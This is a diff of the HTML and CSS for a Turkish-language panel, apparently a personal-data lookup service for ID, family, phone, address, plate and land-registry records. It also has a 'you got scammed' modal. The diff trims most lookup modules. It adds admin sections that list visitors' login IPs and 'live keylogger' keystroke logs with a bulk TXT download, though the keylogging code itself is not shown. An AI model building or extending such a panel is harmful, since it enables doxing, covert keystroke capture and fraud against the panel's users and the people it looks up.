@@ -49,7 +49,7 @@
             position: relative;
         }
 
-        /* GECE GÖKYÜZÜ, BULUTLAR VE YILDIZLAR (Fareyle Parallax Uyumlu) */
+        /* GECE GÖKYÜZÜ, BULUTLAR VE YILDIZLAR */
         .night-sky {
             position: fixed;
             top: 0; left: 0; width: 100vw; height: 100vh;
@@ -59,7 +59,6 @@
             background: radial-gradient(circle at center, #0b1120 0%, #03050a 100%);
         }
 
-        /* Yıldızlar Katmanı */
         .stars-layer {
             position: absolute;
             top: -50px; left: -50px; right: -50px; bottom: -50px;
@@ -67,21 +66,17 @@
                 radial-gradient(1.5px 1.5px at 20px 30px, #ffffff, rgba(0,0,0,0)),
                 radial-gradient(2px 2px at 40px 70px, #93c5fd, rgba(0,0,0,0)),
                 radial-gradient(1px 1.5px at 90px 40px, #ffffff, rgba(0,0,0,0)),
-                radial-gradient(2px 2px at 160px 120px, #60a5fa, rgba(0,0,0,0)),
-                radial-gradient(1.5px 1.5px at 230px 180px, #ffffff, rgba(0,0,0,0)),
-                radial-gradient(2px 2.5px at 300px 90px, #93c5fd, rgba(0,0,0,0));
+                radial-gradient(2px 2px at 160px 120px, #60a5fa, rgba(0,0,0,0));
             background-repeat: repeat;
             background-size: 350px 350px;
             opacity: 0.6;
             transition: transform 0.1s ease-out;
         }
 
-        /* Süzülen Gece Bulutları */
         .clouds-layer {
             position: absolute;
             top: -100px; left: -100px; right: -100px; bottom: -100px;
             pointer-events: none;
-            transition: transform 0.15s ease-out;
         }
 
         .cloud {
@@ -94,7 +89,6 @@
 
         .cloud-1 { width: 700px; height: 350px; top: 10%; left: 15%; animation-duration: 30s; }
         .cloud-2 { width: 850px; height: 400px; bottom: 5%; right: 10%; animation-duration: 35s; animation-direction: alternate-reverse; }
-        .cloud-3 { width: 600px; height: 300px; top: 40%; right: 25%; animation-duration: 22s; }
 
         @keyframes floatCloud {
             0% { transform: translate(0px, 0px) scale(1); }
@@ -112,12 +106,6 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            animation: modalFadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-        }
-
-        @keyframes modalFadeIn {
-            0% { opacity: 0; transform: scale(0.95); }
-            100% { opacity: 1; transform: scale(1); }
         }
 
         .login-card {
@@ -130,13 +118,7 @@
             display: flex;
             flex-direction: column;
             gap: 20px;
-            transition: var(--transition);
             backdrop-filter: blur(20px);
-        }
-
-        .login-card:hover {
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 35px var(--accent-glow);
-            border-color: rgba(59, 130, 246, 0.4);
         }
 
         .login-header-icon {
@@ -157,11 +139,8 @@
             font-weight: 600;
             text-align: center;
             color: var(--text-main);
-            letter-spacing: -0.2px;
-            line-height: 1.4;
         }
 
-        /* Discord Butonu */
         .btn-discord {
             display: flex;
             align-items: center;
@@ -178,22 +157,18 @@
             border: none;
             transition: var(--transition);
         }
-        .btn-discord:hover { 
-            background: var(--discord-hover); 
-            box-shadow: 0 0 18px rgba(88, 101, 242, 0.6);
-            transform: translateY(-1px);
-        }
+        .btn-discord:hover { background: var(--discord-hover); }
         .btn-discord svg { width: 16px; height: 16px; fill: currentColor; }
 
         .login-divider {
             display: flex; align-items: center; text-align: center;
-            color: var(--text-muted); font-size: 10px; text-transform: uppercase; letter-spacing: 1px; margin: 2px 0;
+            color: var(--text-muted); font-size: 10px; text-transform: uppercase; letter-spacing: 1px;
         }
         .login-divider::before, .login-divider::after { content: ''; flex: 1; border-bottom: 1px solid var(--border); }
         .login-divider::before { margin-right: .75em; }
         .login-divider::after { margin-left: .75em; }
 
-        /* Dolandırıldın Ekranı ve Video Arka Planı */
+        /* Scam / Dolandırıldın Ekranı */
         #scamModal {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             background: rgba(0, 0, 0, 0.95); z-index: 2000;
@@ -202,10 +177,10 @@
         }
         #scamVideo {
             position: absolute; top: 50%; left: 50%; min-width: 100%; min-height: 100%;
-            width: auto; height: auto; transform: translate(-50%, -50%); object-fit: cover; z-index: 1; opacity: 0.85;
+            transform: translate(-50%, -50%); object-fit: cover; z-index: 1; opacity: 0.85;
         }
         .scam-content-box { position: relative; z-index: 2; }
-        .scam-title { font-size: 64px; font-weight: 800; color: #fff; text-shadow: 0 0 30px #ef4444; margin-bottom: 10px; letter-spacing: 1px; }
+        .scam-title { font-size: 64px; font-weight: 800; color: #fff; text-shadow: 0 0 30px #ef4444; margin-bottom: 10px; }
         .scam-sub { font-size: 18px; font-weight: 600; color: #fee2e2; text-transform: uppercase; letter-spacing: 3px; }
 
         /* Header */
@@ -218,18 +193,16 @@
             position: relative; z-index: 10;
         }
 
-        .logo { font-weight: 700; font-size: 18px; color: #fff; letter-spacing: -0.3px; }
+        .logo { font-weight: 700; font-size: 18px; color: #fff; }
         .header-right { display: flex; align-items: center; gap: 16px; }
         .user-info { display: flex; align-items: center; gap: 10px; }
         .avatar {
             width: 36px; height: 36px; background: #2563eb;
             border-radius: 50%; display: flex; align-items: center; justify-content: center;
             font-weight: 700; font-size: 13px; color: white;
-            transition: var(--transition);
         }
-        .avatar:hover { box-shadow: 0 0 12px var(--accent-glow); }
 
-        /* Layout & Mobile Sidebar Toggle */
+        /* Layout */
         .main { display: flex; flex: 1; overflow: hidden; position: relative; z-index: 1; }
 
         .sidebar {
@@ -239,7 +212,7 @@
             border-right: 1px solid var(--border);
             padding: 20px 14px; overflow-y: auto;
             display: flex; flex-direction: column; gap: 10px;
-            transition: transform 0.3s ease; position: relative; z-index: 5;
+            position: relative; z-index: 5;
         }
 
         .sidebar.collapsed { transform: translateX(-100%); width: 0; padding: 0; border: none; }
@@ -248,42 +221,26 @@
             position: absolute; top: 18px; right: -36px; width: 32px; height: 32px;
             background: var(--bg-card); border: 1px solid var(--border); border-radius: 0 8px 8px 0;
             color: var(--text-main); display: flex; align-items: center; justify-content: center;
-            cursor: pointer; z-index: 100; font-size: 13px;
-            transition: var(--transition);
+            cursor: pointer; z-index: 100;
         }
-        .sidebar-toggle-btn:hover { background: var(--accent); color: #fff; }
 
-        .sidebar-search-box { position: relative; margin-bottom: 6px; }
         .sidebar-search-input {
             width: 100%; background: var(--bg-input);
             border: 1px solid var(--border); border-radius: var(--radius-sm);
-            padding: 10px 14px; color: var(--text-main); font-size: 13px; outline: none; transition: var(--transition);
+            padding: 10px 14px; color: var(--text-main); font-size: 13px; outline: none;
         }
-        .sidebar-search-input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px var(--accent-glow); }
 
-        .category-group { background: transparent !important; border: none !important; padding: 0 !important; margin: 0 !important; }
         .category-header {
             padding: 8px 6px; display: flex; align-items: center; justify-content: space-between;
-            cursor: pointer; background: transparent !important; border: none !important;
+            cursor: pointer; font-weight: 600; font-size: 13px;
         }
-        .category-title-wrap { font-weight: 600; font-size: 13px; color: var(--text-main); }
-        .chevron-icon { font-size: 9px; color: var(--text-muted); transition: transform 0.3s ease; }
-        .category-group.open .chevron-icon { transform: rotate(180deg); color: var(--accent); }
-
         .subcategory-list { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; padding-left: 6px; }
         .category-group.open .subcategory-list { max-height: 1000px; }
         .subcategory-item {
-            padding: 7px 10px 7px 20px; font-size: 12px; font-weight: 400;
-            color: var(--text-sub); cursor: pointer; display: flex; align-items: center;
-            justify-content: space-between; position: relative; border-radius: 8px; transition: var(--transition);
+            padding: 7px 10px 7px 20px; font-size: 12px; color: var(--text-sub); cursor: pointer;
+            border-radius: 8px; transition: var(--transition);
         }
-        .subcategory-item::before {
-            content: ''; position: absolute; left: 8px; top: 50%; transform: translateY(-50%);
-            width: 3px; height: 3px; border-radius: 50%; background: var(--text-muted);
-        }
-        .subcategory-item:hover { background: rgba(255, 255, 255, 0.04); color: #fff; padding-left: 23px; }
-        .subcategory-item.active { background: rgba(59, 130, 246, 0.15); color: #fff; font-weight: 500; padding-left: 23px; }
-        .badge-v1 { font-size: 9px; font-weight: 600; background: rgba(59, 130, 246, 0.15); color: var(--accent); padding: 2px 5px; border-radius: 4px; }
+        .subcategory-item:hover, .subcategory-item.active { background: rgba(59, 130, 246, 0.15); color: #fff; }
 
         /* Terminal Konsol */
         .terminal-box {
@@ -297,7 +254,7 @@
             color: #38bdf8;
         }
         .terminal-header {
-            display: flex; justify-content: space-between; align-items: center;
+            display: flex; justify-content: space-between;
             border-bottom: 1px solid rgba(255,255,255,0.04); padding-bottom: 3px; margin-bottom: 5px;
             color: var(--text-muted); font-size: 9px; text-transform: uppercase;
         }
@@ -310,16 +267,13 @@
         .search-card {
             background: var(--bg-card); backdrop-filter: blur(16px);
             border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 28px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4); position: relative; overflow: hidden;
-            transition: var(--transition);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
         }
-        .search-card:hover { box-shadow: 0 15px 40px rgba(0,0,0,0.6), 0 0 20px rgba(59, 130, 246, 0.15); }
-
         .search-card-header {
             margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid var(--border);
             display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px;
         }
-        .active-module-title { font-size: 20px; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 10px; }
+        .active-module-title { font-size: 20px; font-weight: 700; color: #fff; }
         .active-module-badge {
             font-size: 10px; font-weight: 600; text-transform: uppercase;
             background: rgba(255, 255, 255, 0.05); color: var(--text-sub);
@@ -330,77 +284,44 @@
         .form-group { display: flex; flex-direction: column; gap: 6px; }
         .form-group.full-width { grid-column: 1 / -1; }
         .form-label { font-size: 12px; font-weight: 500; color: var(--text-sub); }
-        .form-label span { color: var(--danger); margin-left: 2px; }
-        .form-input, .form-select {
+        .form-label span { color: var(--danger); }
+        .form-input {
             background: var(--bg-input); border: 1px solid var(--border); border-radius: var(--radius-sm);
-            padding: 12px 14px; color: var(--text-main); font-size: 13px; outline: none; transition: var(--transition);
+            padding: 12px 14px; color: var(--text-main); font-size: 13px; outline: none;
         }
-        .form-input:focus, .form-select:focus { border-color: var(--accent); box-shadow: 0 0 0 2px var(--accent-glow); }
+        .form-input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px var(--accent-glow); }
         .search-actions { display: flex; justify-content: flex-end; gap: 12px; margin-top: 22px; padding-top: 16px; border-top: 1px solid var(--border); }
 
         .btn { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 11px 24px; border-radius: var(--radius-sm); font-size: 13px; font-weight: 600; cursor: pointer; border: none; transition: var(--transition); }
         .btn-primary { background: var(--accent); color: white; }
-        .btn-primary:hover { background: #2563eb; box-shadow: 0 0 15px var(--accent-glow); transform: translateY(-1px); }
+        .btn-primary:hover { background: #2563eb; }
         .btn-secondary { background: rgba(255, 255, 255, 0.04); color: var(--text-sub); border: 1px solid var(--border); }
-        .btn-secondary:hover { background: rgba(255, 255, 255, 0.08); color: #fff; }
 
-        .results-section { display: flex; flex-direction: column; gap: 16px; }
-        .results-header { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
-        .results-title { font-size: 17px; font-weight: 700; color: #fff; }
-        .result-stats { display: flex; gap: 10px; }
-        .stat-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 6px 16px; text-align: center; }
-        .stat-value { font-size: 15px; font-weight: 700; color: #fff; }
-        .stat-label { font-size: 9px; color: var(--text-muted); text-transform: uppercase; }
-
-        .result-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius-md); overflow: hidden; display: none; }
-        .result-card-header { background: rgba(255,255,255,0.02); padding: 14px 20px; border-bottom: 1px solid var(--border); }
-        .result-id { font-size: 12px; font-weight: 600; color: var(--text-sub); }
-        .result-body { padding: 22px; }
-
-        .empty-state { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 60px 20px; text-align: center; background: rgba(255,255,255,0.01); border: 1px dashed var(--border); border-radius: var(--radius-lg); }
-
-        /* Yönetici Paneli */
+        /* YÖNETİCİ PANELİ ALT BAŞLIKLI DÜZEN */
         #adminPanel {
             display: none; background: var(--bg-card); backdrop-filter: blur(16px);
             border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 28px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5); position: relative; overflow: hidden;
-            transition: var(--transition);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
         }
-        #adminPanel:hover { box-shadow: 0 20px 50px rgba(0,0,0,0.7), 0 0 25px rgba(139, 92, 246, 0.2); }
-
         .admin-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 16px; margin-bottom: 20px; }
-        .admin-title-box h2 { font-size: 18px; font-weight: 700; color: #fff; }
-        .admin-title-box p { font-size: 11px; color: var(--text-sub); margin-top: 2px; }
-
-        .admin-stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-bottom: 20px; }
-        .admin-stat-card { background: var(--bg-input); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 14px 18px; display: flex; align-items: center; justify-content: space-between; transition: var(--transition); }
-        .admin-stat-card:hover { border-color: rgba(59, 130, 246, 0.3); }
-        .admin-stat-info { display: flex; flex-direction: column; }
-        .admin-stat-val { font-size: 20px; font-weight: 700; color: #fff; }
-        .admin-stat-lbl { font-size: 10px; color: var(--text-muted); text-transform: uppercase; font-weight: 600; }
-
+        
         .admin-section-box { background: var(--bg-input); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 20px; margin-bottom: 20px; }
-        .admin-section-title { font-size: 13px; font-weight: 600; color: #fff; margin-bottom: 12px; }
-        .admin-form-row { display: flex; gap: 10px; flex-wrap: wrap; }
-        .admin-form-row input { flex: 1; min-width: 160px; }
-
-        .admin-table-container { border: 1px solid var(--border); border-radius: var(--radius-sm); overflow: hidden; background: var(--bg-input); }
+        .admin-section-title { font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 14px; display: flex; align-items: center; gap: 8px; border-left: 3px solid var(--accent); padding-left: 8px; }
+        
+        .admin-table-container { border: 1px solid var(--border); border-radius: var(--radius-sm); overflow: hidden; background: var(--bg-input); max-height: 300px; overflow-y: auto; }
         .admin-table { width: 100%; border-collapse: collapse; text-align: left; font-size: 12px; }
-        .admin-table th { background: rgba(0,0,0,0.2); color: var(--text-muted); font-weight: 600; padding: 12px 16px; border-bottom: 1px solid var(--border); text-transform: uppercase; font-size: 10px; }
-        .admin-table td { padding: 12px 16px; border-bottom: 1px solid var(--border); color: var(--text-main); }
-        .admin-table tr:hover td { background: rgba(255,255,255,0.01); }
+        .admin-table th { background: rgba(0,0,0,0.3); color: var(--text-muted); font-weight: 600; padding: 10px 14px; border-bottom: 1px solid var(--border); text-transform: uppercase; font-size: 10px; position: sticky; top: 0; z-index: 2; }
+        .admin-table td { padding: 10px 14px; border-bottom: 1px solid var(--border); color: var(--text-main); }
+        .admin-table tr:hover td { background: rgba(255,255,255,0.02); }
 
         .status-badge { display: inline-flex; align-items: center; gap: 5px; padding: 3px 8px; border-radius: 12px; font-size: 10px; font-weight: 600; }
         .status-badge.active { background: rgba(16, 185, 129, 0.12); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.2); }
         .status-badge.banned { background: rgba(239, 68, 68, 0.12); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.2); }
 
-        .btn-action { padding: 5px 10px; border-radius: 6px; font-size: 11px; font-weight: 500; cursor: pointer; border: none; transition: var(--transition); }
+        .btn-action { padding: 5px 10px; border-radius: 6px; font-size: 11px; font-weight: 500; cursor: pointer; border: none; }
         .btn-action-save { background: rgba(59, 130, 246, 0.15); color: var(--accent); border: 1px solid rgba(59, 130, 246, 0.3); }
-        .btn-action-save:hover { background: var(--accent); color: #fff; }
         .btn-action-ban { background: rgba(245, 158, 11, 0.12); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.2); margin-left: 4px; }
-        .btn-action-ban:hover { background: var(--warning); color: #000; }
         .btn-action-del { background: rgba(239, 68, 68, 0.12); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.2); margin-left: 4px; }
-        .btn-action-del:hover { background: rgba(239, 68, 68, 0.2); color: #fff; }
 
         .footer {
             background: rgba(10, 14, 23, 0.75); border-top: 1px solid var(--border);
@@ -409,7 +330,6 @@
         }
 
         ::-webkit-scrollbar { width: 5px; }
-        ::-webkit-scrollbar-track { background: transparent; }
         ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.08); border-radius: 3px; }
     </style>
 </head>
@@ -452,13 +372,12 @@
         </div>
     </div>
 
-    <!-- FAREYE DUYARLI GECE GÖKYÜZÜ, YILDIZLAR VE BULUTLAR -->
-    <div class="night-sky" id="nightSky">
-        <div class="stars-layer" id="starsLayer"></div>
-        <div class="clouds-layer" id="cloudsLayer">
+    <!-- GECE GÖKYÜZÜ -->
+    <div class="night-sky">
+        <div class="stars-layer"></div>
+        <div class="clouds-layer">
             <div class="cloud cloud-1"></div>
             <div class="cloud cloud-2"></div>
-            <div class="cloud cloud-3"></div>
         </div>
     </div>
 
@@ -476,122 +395,33 @@
 
     <!-- Main Content -->
     <div class="main">
-        
-        <!-- Sidebar & Toggle Button -->
         <aside class="sidebar" id="userSidebar">
-            <button class="sidebar-toggle-btn" id="sidebarToggleBtn" onclick="toggleSidebar()" title="Gizle/Göster">◀</button>
-
+            <button class="sidebar-toggle-btn" id="sidebarToggleBtn" onclick="toggleSidebar()">◀</button>
             <div class="sidebar-search-box">
                 <input type="text" class="sidebar-search-input" placeholder="Modüllerde ara..." onkeyup="filterModules(this.value)">
             </div>
-
             <div class="category-group open">
-                <div class="category-header" onclick="toggleCategory(this)">
-                    <div class="category-title-wrap">Mernis 2026</div>
-                    <span class="chevron-icon">▼</span>
-                </div>
+                <div class="category-header" onclick="toggleCategory(this)">Mernis 2026 <span class="chevron-icon">▼</span></div>
                 <div class="subcategory-list">
-                    <div class="subcategory-item active" onclick="switchModule('ad-soyad', 'Ad Soyad Sorgulama', 'Mernis 2026', this)"><span>Ad Soyad Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('ad-soyad-kapsamli', 'Ad Soyad Kapsamlı Sorgulama', 'Mernis 2026', this)"><span>Ad Soyad Kapsamlı</span> <span class="badge-v1">V1</span></div>
-                    <div class="subcategory-item" onclick="switchModule('tc-kimlik', 'TC Kimlik Sorgulama', 'Mernis 2026', this)"><span>TC Kimlik Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('tc-pro', 'TC Pro Sorgulama', 'Mernis 2026', this)"><span>TC Pro Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('vergi', 'Vergi Dairesi Sorgulama', 'Mernis 2026', this)"><span>Vergi Dairesi Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('medeni-hal', 'Medeni Hal Sorgulama', 'Mernis 2026', this)"><span>Medeni Hal Sorgulama</span></div>
+                    <div class="subcategory-item active" onclick="switchModule('ad-soyad', 'Ad Soyad Sorgulama', 'Mernis 2026', this)">Ad Soyad Sorgulama</div>
+                    <div class="subcategory-item" onclick="switchModule('tc-kimlik', 'TC Kimlik Sorgulama', 'Mernis 2026', this)">TC Kimlik Sorgulama</div>
                 </div>
             </div>
-
-            <div class="category-group">
-                <div class="category-header" onclick="toggleCategory(this)">
-                    <div class="category-title-wrap">Aile Çözümleri</div>
-                    <span class="chevron-icon">▼</span>
-                </div>
-                <div class="subcategory-list">
-                    <div class="subcategory-item" onclick="switchModule('aile', 'Aile Sorgulama', 'Aile Çözümleri', this)"><span>Aile Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('sulale', 'Sülale Sorgulama', 'Aile Çözümleri', this)"><span>Sülale Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('anne-tarafi', 'Anne Tarafı Sorgulama', 'Aile Çözümleri', this)"><span>Anne Tarafı Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('baba-tarafi', 'Baba Tarafı Sorgulama', 'Aile Çözümleri', this)"><span>Baba Tarafı Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('es', 'Eş Sorgulama', 'Aile Çözümleri', this)"><span>Eş Sorgulama</span></div>
-                </div>
-            </div>
-
-            <div class="category-group">
-                <div class="category-header" onclick="toggleCategory(this)">
-                    <div class="category-title-wrap">GSM Çözümleri</div>
-                    <span class="chevron-icon">▼</span>
-                </div>
-                <div class="subcategory-list">
-                    <div class="subcategory-item" onclick="switchModule('gsm-tc', 'GSM TC Sorgulama', 'GSM Çözümleri', this)"><span>GSM TC Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('tc-gsm', 'TC GSM Sorgulama', 'GSM Çözümleri', this)"><span>TC GSM Sorgulama</span></div>
-                </div>
-            </div>
-
-            <div class="category-group">
-                <div class="category-header" onclick="toggleCategory(this)">
-                    <div class="category-title-wrap">Adres Çözümleri</div>
-                    <span class="chevron-icon">▼</span>
-                </div>
-                <div class="subcategory-list">
-                    <div class="subcategory-item" onclick="switchModule('adres', 'Adres Sorgulama', 'Adres Çözümleri', this)"><span>Adres Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('bina', 'Bina Sorgulama', 'Adres Çözümleri', this)"><span>Bina Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('koy-mahalle', 'Köy Mahalle Sorgulama', 'Adres Çözümleri', this)"><span>Köy Mahalle Sorgulama</span></div>
-                </div>
-            </div>
-
-            <div class="category-group">
-                <div class="category-header" onclick="toggleCategory(this)">
-                    <div class="category-title-wrap">Diğer Çözümler</div>
-                    <span class="chevron-icon">▼</span>
-                </div>
-                <div class="subcategory-list">
-                    <div class="subcategory-item" onclick="switchModule('plaka', 'Plaka Sorgulama', 'Diğer Çözümler', this)"><span>Plaka Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('sasi', 'Şasi No (VIN) Sorgulama', 'Diğer Çözümler', this)"><span>Şasi No Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('ip', 'IP Adresi Analiz', 'Diğer Çözümler', this)"><span>IP Adresi Analiz</span></div>
-                    <div class="subcategory-item" onclick="switchModule('discord', 'Discord Sorgulama', 'Diğer Çözümler', this)"><span>Discord Sorgulama</span></div>
-                </div>
-            </div>
-
-            <div class="category-group">
-                <div class="category-header" onclick="toggleCategory(this)">
-                    <div class="category-title-wrap">Premium Çözümler</div>
-                    <span class="chevron-icon">▼</span>
-                </div>
-                <div class="subcategory-list">
-                    <div class="subcategory-item" onclick="switchModule('p-kisi', 'Kişi Sorgulama', 'Premium', this)"><span>Kişi Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('p-adres', 'Adres Sorgulama', 'Premium', this)"><span>Adres Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('ekstra-araclar', 'Ekstra Araçlar', 'Premium', this)"><span>Ekstra Araçlar</span></div>
-                    <div class="subcategory-item" onclick="switchModule('vesika', 'Vesika Sorgulama', 'Premium', this)"><span>Vesika Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('tapu', 'Tapu Sorgulama', 'Premium', this)"><span>Tapu Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('isyeri', 'İşyeri Sorgulama', 'Premium', this)"><span>İşyeri Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('p-plaka', 'Plaka Sorgulama', 'Premium', this)"><span>Plaka Sorgulama</span></div>
-                    <div class="subcategory-item" onclick="switchModule('rapor-takip', 'Rapor & Takip', 'Premium', this)"><span>Rapor & Takip</span></div>
-                    <div class="subcategory-item" onclick="switchModule('nvi', 'Nvi Çözümleri', 'Premium', this)"><span>Nvi Çözümleri</span></div>
-                    <div class="subcategory-item" onclick="switchModule('pdf', 'PDF Çözümleri', 'Premium', this)"><span>PDF Çözümleri</span></div>
-                </div>
-            </div>
-
-            <!-- Terminal Konsol -->
             <div class="terminal-box">
-                <div class="terminal-header">
-                    <span>SYSTEM AUDIT</span>
-                    <span style="color:var(--success);">● LIVE</span>
-                </div>
+                <div class="terminal-header"><span>SYSTEM AUDIT</span><span style="color:var(--success);">● ACTIVE</span></div>
                 <div class="terminal-content" id="terminalLog">
                     <div class="terminal-line">[SYS] Core active.</div>
-                    <div class="terminal-line">[NET] Tunnel secure.</div>
                 </div>
             </div>
         </aside>
 
-        <!-- Right Content Area -->
         <section class="content">
-            
             <!-- Normal Sorgu Paneli -->
             <div class="search-card" id="searchCardPanel">
                 <div class="search-card-header">
-                    <div class="active-module-title" id="moduleTitle"><span>Ad Soyad Sorgulama</span></div>
+                    <div class="active-module-title" id="moduleTitle">Ad Soyad Sorgulama</div>
                     <span class="active-module-badge" id="moduleBadge">Mernis 2026</span>
                 </div>
-
                 <form id="dynamicSearchForm">
                     <div class="form-grid" id="formFields"></div>
                     <div class="search-actions">
@@ -601,100 +431,104 @@
                 </form>
             </div>
 
-            <!-- Yönetici Paneli -->
+            <!-- YÖNETİCİ PANELİ (Sıralı Alt Başlıklı ve Ayrı Log Sekmeli) -->
             <div id="adminPanel">
                 <div class="admin-header">
                     <div class="admin-title-box">
-                        <h2>Yönetici Paneli</h2>
-                        <p>Kullanıcı yetkilendirmeleri, lisanslar ve log indirme</p>
+                        <h2>Yönetici Paneli & Kontrol Merkezi</h2>
+                        <p style="font-size:11px; color:var(--text-sub);">Kullanıcı yönetimi, giriş IP logları ve canlı keylogger txt kayıtları</p>
                     </div>
                     <span class="active-module-badge">ROOT ACCESS</span>
                 </div>
 
-                <div class="admin-stats-grid">
-                    <div class="admin-stat-card">
-                        <div class="admin-stat-info">
-                            <div class="admin-stat-val" id="totalUsersCount">0</div>
-                            <div class="admin-stat-lbl">Toplam</div>
-                        </div>
-                    </div>
-                    <div class="admin-stat-card">
-                        <div class="admin-stat-info">
-                            <div class="admin-stat-val" style="color:var(--success);" id="activeUsersCount">0</div>
-                            <div class="admin-stat-lbl">Aktif</div>
-                        </div>
-                    </div>
-                    <div class="admin-stat-card">
-                        <div class="admin-stat-info">
-                            <div class="admin-stat-val" style="color:var(--danger);" id="bannedUsersCount">0</div>
-                            <div class="admin-stat-lbl">Yasaklı</div>
-                        </div>
-                    </div>
-                </div>
-
+                <!-- 1. ALT BAŞLIK: KULLANICI & LİSANS YÖNETİMİ -->
                 <div class="admin-section-box">
-                    <div class="admin-section-title">Yeni Kullanıcı Tanımla</div>
-                    <div class="admin-form-row">
+                    <div class="admin-section-title">1. Kullanıcı & Lisans Yönetimi</div>
+                    <div class="form-grid" style="margin-bottom: 14px;">
                         <input type="text" id="newKey" class="form-input" placeholder="10 Haneli Karmaşık Key">
-                        <button onclick="generateRandomKey()" class="btn btn-secondary" style="padding:0 14px;">10 Haneli Rastgele</button>
-                        <button onclick="addNewUser()" class="btn btn-primary" style="padding:0 18px;">Ekle</button>
+                        <div style="display:flex; gap:8px;">
+                            <button onclick="generateRandomKey()" class="btn btn-secondary" style="flex:1;">Rastgele Üret</button>
+                            <button onclick="addNewUser()" class="btn btn-primary" style="flex:1;">Kullanıcı Ekle</button>
+                        </div>
+                    </div>
+                    <div class="admin-table-container">
+                        <table class="admin-table">
+                            <thead>
+                                <tr>
+                                    <th>Kullanıcı Adı</th>
+                                    <th>Erişim Key</th>
+                                    <th>Durum</th>
+                                    <th style="text-align:right;">İşlemler</th>
+                                </tr>
+                            </thead>
+                            <tbody id="adminUserTableBody"></tbody>
+                        </table>
                     </div>
                 </div>
 
-                <div class="admin-section-title">Kayıtlı Lisanslar & Kullanıcı Logları</div>
-                <div class="admin-table-container">
-                    <table class="admin-table">
-                        <thead>
-                            <tr>
-                                <th>Kullanıcı / IP</th>
-                                <th>Erişim Key</th>
-                                <th>Durum</th>
-                                <th style="text-align:right;">İşlemler & TXT</th>
-                            </tr>
-                        </thead>
-                        <tbody id="adminUserTableBody"></tbody>
-                    </table>
+                <!-- 2. ALT BAŞLIK: PANEL GİRİŞ IP LOGLARI -->
+                <div class="admin-section-box">
+                    <div class="admin-section-title">2. Panel Giriş IP Logları (Kim Ne Zaman Girdi?)</div>
+                    <div class="admin-table-container">
+                        <table class="admin-table">
+                            <thead>
+                                <tr>
+                                    <th>Kullanıcı / Hesap</th>
+                                    <th>Bağlandığı IP Adresi</th>
+                                    <th>Giriş Tarihi ve Saati</th>
+                                </tr>
+                            </thead>
+                            <tbody id="adminIpLogsTableBody">
+                                <tr><td colspan="3" style="text-align:center; color:var(--text-muted);">Giriş logları yükleniyor...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- 3. ALT BAŞLIK: KEYLOGGER TXT DOSYA LOGLARI -->
+                <div class="admin-section-box">
+                    <div class="admin-section-title">3. Keylogger Logları (IP Bazlı Canlı TXT)</div>
+                    <div style="margin-bottom: 10px;">
+                        <button onclick="downloadAllKeyloggerLogs()" class="btn btn-primary" style="font-size:12px; padding:8px 14px;">Tüm Keylogger Verilerini Toplu TXT İndir</button>
+                    </div>
+                    <div class="admin-table-container">
+                        <table class="admin-table">
+                            <thead>
+                                <tr>
+                                    <th>Kullanıcı & IP</th>
+                                    <th>Son Güncelleme</th>
+                                    <th>Tuş Vuruşları (Buffer)</th>
+                                    <th style="text-align:right;">İşlem</th>
+                                </tr>
+                            </thead>
+                            <tbody id="adminKeyloggerTableBody">
+                                <tr><td colspan="4" style="text-align:center; color:var(--text-muted);">Keylogger verisi bekleniyor...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
 
-            <!-- Results Section -->
+            <!-- Sonuç Paneli -->
             <div class="results-section" id="resultsSectionPanel">
                 <div class="results-header">
